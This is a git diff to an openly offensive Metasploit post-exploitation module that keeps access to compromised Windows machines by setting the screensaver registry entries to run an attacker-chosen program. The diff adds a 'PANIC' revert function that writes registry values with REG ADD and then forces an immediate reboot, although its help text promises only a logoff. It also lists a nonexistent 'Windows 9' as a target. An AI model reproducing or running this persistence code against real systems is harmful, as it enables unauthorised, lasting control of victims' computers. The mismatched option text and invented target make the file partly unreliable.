@@ -9,7 +9,7 @@
 ##
 # Exploit Title  : SCRNSAVE_T1180_persistence.rb
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
-# Affected system: Windows (2008|xp|vista|7|10)
+# Affected system: Windows (2008|xp|vista|7|9|10)
 # POC: https://attack.mitre.org/techniques/T1180/
 #
 #
@@ -22,11 +22,12 @@
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on           => set SESSION 3
-# Set inactivity timeout before screensaver runs     => set TIME_OUT 10
-# Set absoluct path of PE or application to run      => set APPL_PATH C:\\Windows\\System32\\calc.exe
-# Set the absoluct path where to store logfiles      => set LOOT_FOLDER /root/.msf4/loot
-# LogOff current user to force registry refresh?     => set LOG_OFF true
+# The session number to run this module on              => set SESSION 3
+# Set inactivity timeout before screensaver runs (sec)  => set TIME_OUT 10
+# Set absoluct path of PE or application to run         => set APPL_PATH C:\\Windows\\System32\\calc.exe
+# Set the absoluct path where to store logfiles (local) => set LOOT_FOLDER /root/.msf4/loot
+# LogOff current user to force registry refresh?        => set LOG_OFF true
+# Revert target registry settings to defaut and logoff? => set PANIC true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -95,15 +96,15 @@ class MetasploitModule < Msf::Post
                                         'Special Thanks: shanty damayanti',
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
-                        'DisclosureDate' => 'fev 8 2019',
+                        'Version'        => '$Revision: 1.1',
+                        'DisclosureDate' => 'fev 9 2019',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',   # Thats no need for privilege escalation.
                         'Targets'        =>
                                 [
                                          # Affected systems are.
-                                         [ 'Windows 2008', 'Windows xp', 'windows vista', 'windows 7', 'Windows 10' ]
+                                         [ 'Windows 2008', 'Windows xp', 'windows vista', 'windows 7', 'windows 9', 'Windows 10' ]
                                 ],
                         'DefaultTarget'  => '5', # Default its to run againts windows 10
                         'References'     =>
@@ -134,6 +135,7 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptBool.new('LOG_OFF', [ false, 'LogOff current user to force registry refresh?', false]),
+                                OptBool.new('PANIC', [ false, 'Revert target registry settings to defaut and logoff?', false]),
                                 OptString.new('LOOT_FOLDER', [ true, 'Set the absoluct path where to store logfiles (local)'])
                         ], self.class)
 
@@ -225,6 +227,28 @@ def run
       print_error("NOT FOUND: #{hive_key} SCRNSAVE.EXE")
       print_warning("Target system does not appear to be vulnerable to the exploit code.")
       Rex::sleep(1.0)
+      return nil
+    end
+
+
+    #
+    # panic revert funtion
+    #
+    if datastore['PANIC'] == true
+      print_good("Reverting target registry settings to default and logoff.")
+      Rex::sleep(1.0)
+      cmd_exec("REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1")
+      cmd_exec("REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0")
+      cmd_exec("REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveTimeOut /t REG_SZ /d 180")
+      cmd_exec("REG ADD \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d %windir%\\system32\\Mystify.scr")
+      Rex::sleep(0.6)
+      print_status("Registry values changed in #{sysnfo['Computer']}")
+      print_line("    ScreenSaveActive    : 1")
+      print_line("    ScreenSaverIsSecure : 0")
+      print_line("    ScreenSaveTimeOut   : 180")
+      print_line("    SCRNSAVE.EXE: C:\\windows\\system32\\Mystify.scr")
+      Rex::sleep(1.0)
+      cmd_exec("shutdown /r /t 0")
       return nil
     end
 
